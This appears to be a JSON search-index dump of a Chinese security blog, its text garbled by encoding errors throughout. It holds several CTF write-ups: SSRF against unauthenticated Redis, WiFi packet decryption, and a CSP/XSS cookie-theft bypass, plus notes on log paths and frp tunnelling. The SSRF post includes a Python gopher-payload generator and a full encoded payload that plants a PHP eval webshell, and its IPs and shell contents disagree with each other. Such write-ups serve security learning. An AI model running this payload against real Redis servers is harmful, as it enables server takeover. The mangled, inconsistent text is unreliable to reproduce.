error.logåœ¨åŸºäºDebiançš„Linuxä¸Š(Ubuntu)ï¼Œç³»ç»ŸèŒƒå›´çš„Apacheé”™è¯¯æ—¥å¿—é»˜è®¤ä½ç½®æ˜¯/var/log/apache2/error.logåœ¨åŸºäº Red Hat çš„Linuxä¸­(centos)ï¼Œç³»ç»ŸèŒƒå›´çš„ Apache é”™è¯¯æ—¥å¿—æ–‡ä»¶é»˜è®¤è¢«æ”¾ç½®åœ¨/var/log/httpd/error_logNginx:Windowsï¼šlogs/access.logLinux:/var/log/nginx/access.logé»˜è®¤é…ç½®æ–‡ä»¶ï¼š/etc/nginx/nginx.confIIS:IIS6 é»˜è®¤æƒ…å†µä¸‹ IISæ—¥å¿—æ–‡ä»¶ç›®å½• ä¸º C:\\windows\\system32\\LogFilesIIS7.5 é»˜è®¤æƒ…å†µä¸‹IISæ—¥å¿—ç›®å½•ä¸º â€œ%SystemDrive%\\inetpub\\logs\\LogFilesâ€ å…¶ä¸­%SystemDrive% è¡¨ç¤ºç³»ç»Ÿå®‰è£…ä½ç½®ï¼Œä¸€èˆ¬æŒ‡ C: ç›˜ï¼Œç‚¹å‡»â€œæµè§ˆâ€æŒ‰é’®å¯è‡ªå®šä¹‰å­˜æ”¾IISæ—¥å¿—ç›®å½•ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"æµ…è°ˆSSRFä¸redisåŠå…¶ç›¸å…³é—®é¢˜","slug":"æµ…è°ˆSSRFä¸redisåŠå…¶ç›¸å…³é—®é¢˜","date":"2020-06-13T09:18:38.000Z","updated":"2020-06-13T10:26:14.636Z","comments":true,"path":"2020/06/13/æµ…è°ˆSSRFä¸redisåŠå…¶ç›¸å…³é—®é¢˜/","link":"","permalink":"https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/","excerpt":"","text":"ä»€ä¹ˆæ˜¯Redis Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„value ç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬ string(å­—ç¬¦ä¸²)ã€list ( é“¾è¡¨)ã€ set(é›†åˆ)ã€zset(sorted set â€“ æœ‰åºé›†åˆ)å’Œ hashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/pop ã€ add/remove åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œ redisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ memcached ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯ redis ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave ( ä¸»ä»)åŒæ­¥ã€‚ Redisæ¼æ´Redisä¼šå› ä¸ºé…ç½®ä¸å½“è€Œäº§ç”Ÿæ¼æ´ã€‚Redisé»˜è®¤ç›‘å¬ç«¯å£ä¸º 0.0.0.0:6379,é»˜è®¤æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼Œè¿™æ„å‘³ç€redisæœåŠ¡å™¨æš´æ¼åœ¨å…¬ç½‘å¹¶ä¸”å¯ä»¥è¢«æ“ä½œã€‚Redisæœªæˆæƒæ¼æ´åˆ©ç”¨æƒ…å†µæœ‰å¦‚ä¸‹å‡ ç§1.æ•æ„Ÿæ•°æ®æ³„éœ²2.å†™shell3.æŠŠå…¬é’¥å†™å…¥authorized_keysï¼Œå¯ä»¥ç™»å½•ä¸»æœºã€‚ï¼ˆéœ€è¦Redisä»¥rootæƒé™è¿è¡Œï¼‰4.contrabåå¼¹shell Redisæ¼æ´åˆ©ç”¨å¯¹äºæœªæˆæƒè®¿é—®çš„æƒ…å†µï¼Œå¯ä»¥è·å–åˆ°RedisæœåŠ¡å™¨ipååœ¨æœ¬åœ°è¿œç¨‹è¿æ¥RedisæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æ„é€ æ•°æ®åŒ…å‘RedisæœåŠ¡å™¨å‘é€æ¶æ„ä»£ç ã€‚ SSRFä¸å„ç§åè®®SSRFå…¨ç¨‹ä¸º Server-Side-Request-Forgery æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œå³ä¸ºé€šè¿‡æœåŠ¡å™¨å¯¹å†…ç½‘èµ„æºè¿›è¡Œä¸€äº›è¯·æ±‚ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå†…ç½‘æ‰«æã€ä¸»æœºæ¢æµ‹ã€æ¼æ´åˆ©ç”¨ç­‰æ´»åŠ¨ã€‚ Gopheråè®®Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œå®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œå¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚åœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚ä½†åœ¨WWWå‡ºç°åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œã€‚ç°åœ¨å®ƒåŸºæœ¬è¿‡æ—¶ï¼Œäººä»¬å¾ˆå°‘å†ä½¿ç”¨å®ƒã€‚gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®gopheråè®®æ ¼å¼ï¼šURL: gopher://:/_UrlEncodedTCPStream fileåè®®curlæ”¯æŒfileåè®®ï¼Œå¯ä»¥é€šè¿‡fileåè®®LFIã€‚file:///etc/passwd dictåè®®curlæ”¯æŒdictåè®®ï¼Œå¯ä»¥é€šè¿‡dictåè®®æ¢æµ‹æœåŠ¡ä¿¡æ¯ã€‚curl dict://127.0.0.1:22 ä¾‹é¢˜GKCTF-2020 EasyWebè¿™é“é¢˜æ‹¿åˆ°æ‰‹æ²¡å•¥æ€è·¯ çœ‹åˆ°æºç æç¤ºäº†secretä¹‹åå‘ç°æ˜¯ifconfigç„¶åå°±ä½¿ç”¨burpæ‰«ä¸€ä¸‹å†…ç½‘ï¼Œå‘ç°ä¸€å°173.187.36.11è¿™å°æœåŠ¡å™¨çš„æŠ¥é”™æ˜¯redisçš„æŠ¥é”™ã€‚ç„¶åçˆ†ç ´æ‰«ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°æ˜¯é»˜è®¤çš„6379ã€‚æ¥ä¸‹æ¥è€ƒè™‘SSRFæ‰“å†…ç½‘æœªæˆæƒRedisã€‚EXP: 12345678910111213141516171819202122232425262728293031import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.216.189.11&quot;port=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload æ›¿æ¢urlå’Œpayloadå³å¯ç”Ÿæˆpayloadä¸º 1gopher:&#x2F;&#x2F;173.187.36.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A ç„¶åè®¿é—®http://redis_ip/shell.phpå³å¯getflag å‚è€ƒé“¾æ¥https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNodehttps://zhuanlan.zhihu.com/p/112055947https://www.freebuf.com/column/158065.htmlhttps://www.freebuf.com/vuls/162035.htmlhttps://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"æ¶è‡­æ•°æ®åŒ…","slug":"æ¶è‡­æ•°æ®åŒ…","date":"2020-06-06T14:39:48.000Z","updated":"2020-06-06T15:04:29.218Z","comments":true,"path":"2020/06/06/æ¶è‡­æ•°æ®åŒ…/","link":"","permalink":"https://polosec.github.io/2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/","excerpt":"","text":"æ•°æ®åŒ…åˆ†æä¸‹è½½å®Œæ•°æ®åŒ…ä¹‹åï¼Œprotocolå…¨éƒ½æ˜¯802.11ï¼Œè€ƒè™‘æ•°æ®åŒ…è¢«åŠ å¯†äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œè§£å¯†ã€‚ä½¿ç”¨aircrack-ng å¯¹æ•°æ®åŒ…è¿›è¡Œè§£å¯†ï¼Œä½¿ç”¨çš„å­—å…¸ä¸ºfuzzdict wifipwdtop2000ã€‚ è·‘å‡ºæ¥wifiå¯†ç ä¸º12345678ï¼Œç»“åˆSSIDå¯¹æ•°æ®åŒ…è¿›è¡Œè§£å¯†ã€‚ æ•°æ®åŒ…è§£å¯†é¦–é€‰é¡¹-åè®®-IEEE802.11-ç¼–è¾‘decryption keysã€‚typeé€‰æ‹©wpa-pwd,æ ¼å¼ä¸º wifiå¯†ç :SSIDä¹Ÿå¯ä»¥ä»https://www.wireshark.org/tools/wpa-psk.html æ ¹æ®wifiå¯†ç å’ŒSSIDç”ŸæˆPSKï¼Œtypeé€‰æ‹©PSKå°±å¥½ã€‚ç‚¹å‡»ç¡®è®¤åå°±å¯ä»¥åœ¨æ•°æ®åŒ…é¡µé¢çœ‹åˆ°è§£å¯†çš„åˆ†ç»„äº†ã€‚é¦–å…ˆè¿‡æ»¤httpå’Œtcpåˆ†ç»„ï¼Œè¯­æ³•ä¸ºï¼šhttp and tcpè¿‡æ»¤åå‘ç°æœ‰ä¸Šä¼ å›¾ç‰‡çš„åˆ†ç»„ï¼Œé‚è¿‡æ»¤ä¹‹ï¼Œå–å…¶æ•°æ®å¹¶å¯¼å‡ºã€‚å¯¼å‡ºæ–¹æ³•ï¼šé€‰æ‹©åˆ†ç»„ï¼Œåœ¨åˆ†ç»„è¯¦æƒ…é‚£é€‰ä¸­media type å°±å¯ä»¥è‡ªåŠ¨é€‰æ‹©åª’ä½“æ•°æ®ã€‚ ç„¶åå³é”®å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµå°±å¯ä»¥å¯¼å‡ºå›¾ç‰‡äº†ã€‚ å›¾ç‰‡åˆ†æä¹ æƒ¯æ€§åœ°ä¸¢åˆ°binwalkåˆ†æï¼Œåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæœ‰å¯†ç ï¼Œä¸æ˜¯ä¼ªåŠ å¯†ï¼Œè€ƒè™‘ä»æ•°æ®åŒ…æ‰¾ç­”æ¡ˆã€‚å…¶å®åšåˆ°è¿™é‡Œæœ‰ç‚¹æ²¡æ€è·¯äº†ï¼Œçœ‹äº†çœ‹è§£æå‘ç°æ¥ä¸‹æ¥åšä¸‹å»è¦çœ‹sessionã€‚sessionæ˜¯JWTæ ¼å¼ï¼Œè¿˜åŸåœ°å€ï¼šhttps://www.jstoolset.com/jwtè¿˜åŸåï¼šæç¤ºå‹ç¼©åŒ…å¯†ç æ˜¯åˆšæ‰pingè¿‡çš„ä¸€ä¸ªç½‘ç«™ï¼Œäºæ˜¯æœç´¢icmpåè®®ï¼Œä½†æ˜¯æ²¡æœ‰ã€‚ æŸ³æš—èŠ±æ˜å»pingåŸŸåçš„è¯ä¼šå…ˆè¿›è¡Œdnsè§£æï¼Œäºæ˜¯è¿‡æ»¤dnsåè®®ï¼Œåœ¨æœ€åä¸€ä¸ªdnsåè®®åŒ…é‡Œé¢æ‰¾åˆ°pingçš„åŸŸåï¼Œä½œä¸ºå‹ç¼©åŒ…å¯†ç å¡«è¿›å»ï¼Œå¾—åˆ°flagã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://polosec.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"CSP-XSS Bypass","slug":"CSP-XSS-Bypass","date":"2020-06-02T07:25:59.000Z","updated":"2020-06-02T16:09:24.912Z","comments":true,"path":"2020/06/02/CSP-XSS-Bypass/","link":"","permalink":"https://polosec.github.io/2020/06/02/CSP-XSS-Bypass/","excerpt":"","text":"å‚è€ƒé“¾æ¥ï¼šhttps://www.zhihu.com/question/21979782https://xz.aliyun.com/t/5084#toc-2https://www.cnblogs.com/thenbz3/p/11863641.html CSPçš„æ¦‚å¿µCSP æ˜¯ Content Security Policy çš„ç¼©å†™ï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚CSPæ—¨åœ¨å‡å°‘XSSæ”»å‡»ï¼Œå…·ä½“åŸç†æ˜¯é€šè¿‡è®¾ç½®response headeræˆ–è€…åœ¨é¡µé¢ä¸­ä½¿ç”¨metaæ ‡ç­¾è§„å®šå—ä¿¡ä»»çš„ã€å¯æ‰§è¡Œçš„JSã€å›¾ç‰‡ã€iframeã€styleæ¥æºã€‚ä»»ä½•ä¸ç¬¦åˆCSPè§„åˆ™çš„èµ„æºéƒ½å°†æ— æ³•è¢«åŠ è½½ã€‚ CSPç¤ºä¾‹12Content-Security-Policy: script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https: èµ„æºé™åˆ¶ç±»å‹ï¼ˆå¼•ç”¨ï¼‰ï¼šscript-srcï¼šå¤–éƒ¨è„šæœ¬ æŒ‡å®šäº†å…è®¸ä»å“ªé‡ŒåŠ è½½JSè„šæœ¬style-srcï¼šæ ·å¼è¡¨img-srcï¼šå›¾åƒmedia-srcï¼šåª’ä½“æ–‡ä»¶ï¼ˆéŸ³é¢‘å’Œè§†é¢‘ï¼‰font-srcï¼šå­—ä½“æ–‡ä»¶object-srcï¼šæ’ä»¶ï¼ˆæ¯”å¦‚ Flashï¼‰child-srcï¼šæ¡†æ¶frame-ancestorsï¼šåµŒå…¥çš„å¤–éƒ¨èµ„æºconnect-srcï¼šHTTP è¿æ¥ï¼ˆé€šè¿‡ XHRã€WebSocketsã€EventSourceç­‰ï¼‰worker-srcï¼šworkerè„šæœ¬manifest-srcï¼šmanifest æ–‡ä»¶default-src â€˜selfâ€™ è¯¥å±æ€§å€¼ä¸ºselfæ—¶åªå…è®¸æœ¬ç«™èµ„æºåŠ è½½ã€‚è®¾ç½®äº†è¿™ä¸ªå°±ä¸ºä¸Šè¿°å±æ€§è®¾ç½®äº†é»˜è®¤å€¼â€˜selfâ€™ä¸Šè¿°å±æ€§å¦‚æœä¸æ˜ç¡®æŒ‡å®šçš„è¯åˆ™é»˜è®¤èŒƒå›´æ˜¯*ï¼Œå³å…è®¸æ‰€æœ‰ã€‚script-srcå±æ€§é‡Œé¢ è®¾ç½®unsafe-inline å…è®¸å†…åµŒçš„è„šæœ¬åŠæ ·å¼ ä¸å†™è¿™ä¸ªé»˜è®¤ä¸å…è®¸ã€‚script-srcå±æ€§é‡Œé¢ è®¾ç½®unsafe-eval å…è®¸é€šè¿‡å­—ç¬¦ä¸²åŠ¨æ€åˆ›å»ºçš„è„šæœ¬æ‰§è¡Œï¼Œæ¯”å¦‚ evalï¼ŒsetTimeout ç­‰ã€‚ä¸å†™è¿™ä¸ªé»˜è®¤ä¸å…è®¸ã€‚script-src â€˜nonce-EDNnf03nceIOfn39fn3e9h3sdfaâ€™ è¿™å¥è¯çš„æ„æ€æ˜¯è¯´åªå…è®¸nonceå€¼ä¸ºEDNnf03nceIOfn39fn3e9h3sdfaçš„è„šæœ¬æ‰§è¡Œã€‚(xxx) åŒç†ä¹Ÿå¯ä»¥è®¾ç½®hashå€¼ã€‚ CSPç»•è¿‡CSPç»•è¿‡æˆ‘åªä½¿ç”¨è¿‡ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯Location.hrefï¼Œå…¶ä»–çš„æ–¹æ³•æš‚æ—¶æ²¡æœ‰å°è¯•è¿‡ï¼Œåœ¨ https://xz.aliyun.com/t/5084#toc-2 è¿™ç¯‡æ–‡ç« é‡Œé¢å†™çš„æŒºå¤šçš„ï¼Œå¯ä»¥ä»”ç»†é˜…è¯»ã€‚å¦å¤–ä¸€ç§æˆ‘æ„Ÿè§‰æœ‰æ„æ€çš„ç»•è¿‡å°±æ˜¯CRLFæ³¨å…¥ç»•è¿‡ï¼Œåœ¨CSPä¹‹å‰æ‰¾åˆ°CRLFæ³¨å…¥ç‚¹æ¥ä¸¤ä¸ªCRLFæŠŠCSPæŒ¤åˆ°bodyé‡Œé¢ã€‚ã€‚é«˜ï¼Œå®åœ¨æ˜¯é«˜ CSP BYPASSå®ä¾‹è¿™é“é¢˜æ˜¯CSICN_åä¸œåŒ—èµ›åŒº_WEB2 åœ¨buuojæœ‰å¤ç°ã€‚å…¶ä»–çš„ç‚¹æˆ‘çœ‹ç½‘ä¸Šéƒ½è¯´çš„å·®ä¸å¤šäº† å”¯ç‹¬CSP Bypassè¯´çš„ä¸è¯¦ç»†ï¼Œè¿™é‡Œæˆ‘è¯¦ç»†è¯´ä¸€ä¸‹CSPç»•è¿‡ï¼Œå…¶ä»–çš„ä¸ä»”ç»†è¯´ï¼Œå°±ç®€è¦è¯´ä¸€ä¸‹å¦‚ä½•æˆåŠŸæ‹¿åˆ°flagã€‚æœ‰ä¸ªæŠ•ç¨¿å’Œåé¦ˆï¼Œè¯´äº†ç®¡ç†å‘˜ä¼šæŸ¥çœ‹ï¼ŒçŒœæµ‹XSSæ‹¿cookieã€‚æäº¤ç”³è¯·æ—¶éœ€è¦çˆ†ç ´md5ï¼Œå¥½è¯´ï¼Œå†™è„šæœ¬å³å¯ã€‚å…ˆå°è¯•éšä¾¿æŠ•ç¨¿æŠ•ç¨¿åæŸ¥çœ‹é¡µé¢ï¼Œå‘ç°å­˜åœ¨CSPï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡cspã€‚æ¥ä¸‹æ¥è¿›è¡ŒXSSï¼Œç”±äºè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œæ‰€ä»¥è€ƒè™‘HTMLå®ä½“ç¼–ç â€”æŠŠå­—æ¯è½¬asciiå¹¶åœ¨å‰é¢åŠ ä¸Š&amp;#åé¢åŠ ä¸Š;æ ‡ç­¾å¯ä»¥åµŒå…¥JSä»£ç ã€‚ç›´æ¥ç”¨XSSå¹³å°çš„payloadçš„è¯ä¼šè¿™æ ·ï¼š æ¥ä¸‹æ¥ä½¿ç”¨location.hrefç»•è¿‡ã€‚çˆ†ç ´å®Œmd5åç®¡ç†å‘˜ç‚¹å‡»å®Œåœ¨XSSå¹³å°å°±æ”¶åˆ°cookieå•¦ã€‚æ¥ä¸‹æ¥æ˜¯è”åˆæ³¨å…¥ï¼Œæœ€åä¸€å¥è¯æ˜¯-1 union select 1,2,flagg from ciscn.flagï¼Œå¾—åˆ°flag æ€»ç»“è¿™é“é¢˜æ—¶éš”ä¸€å¹´æ‰å¼„æ˜ç™½CSPæ˜¯æ€ä¹ˆå›äº‹ï¼Œå±å®æˆ‘çš„é—®é¢˜ï¼Œç»§ç»­å­¦ä¹ ï¼Œç»§ç»­åŠªåŠ›ã€‚","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"frpå†…ç½‘ç©¿é€","slug":"frpå†…ç½‘ç©¿é€","date":"2020-06-01T00:28:46.000Z","updated":"2020-06-01T00:58:45.902Z","comments":true,"path":"2020/06/01/frpå†…ç½‘ç©¿é€/","link":"","permalink":"https://polosec.github.io/2020/06/01/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","excerpt":"","text":"å‚è€ƒé“¾æ¥https://blog.csdn.net/fjh1997/article/details/100850756https://zhuanlan.zhihu.com/p/45445979æœ€è¿‘åœ¨æ­å»ºå­¦æ ¡çš„ç½‘ç»œå®‰å…¨è®­ç»ƒå¹³å°ï¼Œä½¿ç”¨çš„æ˜¯CTFD+CTF-Whaleç»„ä»¶ç”ŸæˆåŠ¨æ€ç‹¬ç«‹é¶æœºï¼Œç”±æ­¤å¼•å‘äº†å¯¹å†…ç½‘ç©¿é€çš„æ€è€ƒã€‚é¦–å…ˆç†è§£ä»€ä¹ˆæ˜¯å†…ç½‘ç©¿é€ å†…ç½‘ç©¿é€çš„æ¦‚å¿µäº†è§£å†…ç½‘ç©¿é€å‰ï¼Œéœ€è¦äº†è§£å†…ç½‘ç©¿é€è¿™ä¸ªéœ€æ±‚å‡ºç°çš„åŸå› ã€‚ipv4åœ°å€ç¨€ç¼ºï¼Œäºæ˜¯å‡ºç°äº†NAT,NAPTæŠ€æœ¯å®ç°IPâ€å¤ç”¨â€ã€‚NATï¼šå°†ç§ç½‘åœ°å€é€šè¿‡NATç½‘å…³è½¬æ¢æˆå…¬ç½‘åœ°å€ï¼ŒåŒæ—¶é€šä¿¡çš„æ•°é‡å—NATç½‘å…³å…¬ç½‘åœ°å€æ•°é™åˆ¶ã€‚NAPT:å°†ç§ç½‘åœ°å€å’Œç«¯å£å·é€šè¿‡NAPTç½‘å…³è½¬æ¢æˆå…¬ç½‘åœ°å€ï¼šç«¯å£å·ï¼ŒNAPTç½‘å…³ç»´æŠ¤ä¸€å¼ æ˜ å°„è¡¨ï¼Œè®°å½•å…¬ç½‘ip:portå’Œç§ç½‘ip:portçš„å¯¹åº”å…³ç³»ã€‚è¿™æ ·å¯ä»¥å¤§å¹…åº¦é™ä½å¯¹å…¬ç½‘IPçš„éœ€æ±‚é‡ã€‚ä¸ºä»€ä¹ˆéœ€è¦å†…ç½‘ç©¿é€ï¼Ÿæˆ‘å®¶ç”µè„‘æ˜¯ç§»åŠ¨çš„ï¼Œæ²¡æœ‰ç»™åˆ†é…ç‹¬ç«‹çš„å…¬ç½‘IPï¼Œæˆ‘åœ¨æœ¬æœºæ­å»ºçš„httpæœåŠ¡æ— æ³•è¢«å…¬ç½‘çœ‹åˆ°ã€‚ä¸ºäº†è§£å†³è¿™ç±»é—®é¢˜ï¼Œå†…ç½‘ç©¿é€æŠ€æœ¯åº”éœ€æ±‚è€Œç”Ÿã€‚æ¯”å¦‚è®¿é—®æˆ‘å®¶ç”µè„‘8888ç«¯å£çš„webæœåŠ¡ï¼Œç›´æ¥è®¿é—®æˆ‘ipip.netçœ‹åˆ°çš„ipåœ°å€:8888æ˜¯æ— æ³•è®¿é—®çš„ï¼Œå› ä¸ºNATç½‘å…³æ²¡æœ‰8888å‡ºç«™è®°å½• çš„æ˜ å°„å…³ç³»ã€‚å†…ç½‘ç©¿é€æ¦‚å¿µï¼ˆå¤åˆ¶ï¼‰ï¼šå†…ç½‘ç©¿é€æ˜¯æˆ‘ä»¬åœ¨è¿›è¡Œç½‘ç»œè¿æ¥æ—¶çš„ä¸€ç§æœ¯è¯­ï¼Œä¹Ÿå«åšNATç©¿é€ï¼Œå³åœ¨è®¡ç®—æœºæ˜¯å±€åŸŸç½‘å†…çš„æ—¶å€™ï¼Œå¤–ç½‘ä¸å†…ç½‘çš„è®¡ç®—æœºçš„èŠ‚ç‚¹è¿›è¡Œè¿æ¥æ—¶æ‰€éœ€è¦çš„è¿æ¥é€šä¿¡ï¼Œæœ‰æ—¶å€™å°±ä¼šå‡ºç°å†…ç½‘ç©¿é€ä¸æ”¯çš„æƒ…å†µã€‚å†…ç½‘ç©¿é€çš„åŠŸèƒ½å°±æ˜¯ï¼Œå½“æˆ‘ä»¬åœ¨ç«¯å£æ˜ å°„æ—¶è®¾ç½®æ—¶ï¼Œå†…ç½‘ç©¿é€èµ·åˆ°äº†åœ°å€è½¬æ¢çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯æŠŠå…¬ç½‘çš„åœ°å€è¿›è¡Œç¿»è¯‘ï¼Œè½¬æˆä¸ºä¸€ç§ç§æœ‰çš„åœ°å€ï¼Œç„¶åå†é‡‡ç”¨è·¯ç”±çš„æ–¹å¼ADSLçš„å®½å¸¦è·¯ç”±å™¨ï¼Œå…·æœ‰ä¸€ä¸ªåŠ¨æ€æˆ–è€…æ˜¯å›ºå®šçš„å…¬ç½‘IPï¼Œæœ€åADSLç›´æ¥åœ¨äº¤æ¢æœºä¸Šï¼Œè¿™æ ·æ‰€æœ‰çš„ç”µè„‘éƒ½å¯ä»¥å…±äº«ä¸Šç½‘ã€‚å†…ç½‘ç©¿é€é™¤äº†å¯ä»¥å®ç°å†…ç½‘ä¹‹é—´æœºå™¨çš„ç½‘ç»œé€šä¿¡åŠŸé€šä¹‹å¤–ï¼Œè¿˜å¯ä»¥è§£å†³UDPä¸­å‡ºç°çš„æ•°æ®ä¼ è¾“ä¸ç¨³å®šé—®é¢˜ã€‚çœ‹äº†ä¸¤å¼ å›¾æ„Ÿè§‰å†™çš„æ¯”è¾ƒå¥½ å†…ç½‘ç©¿é€çš„æ€è·¯å†…ç½‘ç”µè„‘ä¸»åŠ¨å‘æ¶ˆæ¯ç»™å…¬ç½‘æœåŠ¡å™¨ï¼Œç›¸å½“äºå…¬ç½‘æœåŠ¡å™¨åœ¨è½¬å‘å†…ç½‘æœåŠ¡å™¨çš„æ•°æ®ï¼Œä½¿ç”¨ç¬¬ä¸‰å°æœºå™¨è®¿é—®å…¬ç½‘æœåŠ¡å™¨çš„æ—¶å€™å³å¯è®¿é—®å†…ç½‘æœåŠ¡å™¨æä¾›çš„æœåŠ¡ã€‚è¿™å—å…¬ç½‘æœåŠ¡å™¨å¸¦å®½é™åˆ¶ã€‚ å†…ç½‘ç©¿é€å®ç°ï¼ˆfrpï¼‰ç½‘ç»œç»“æ„ï¼š 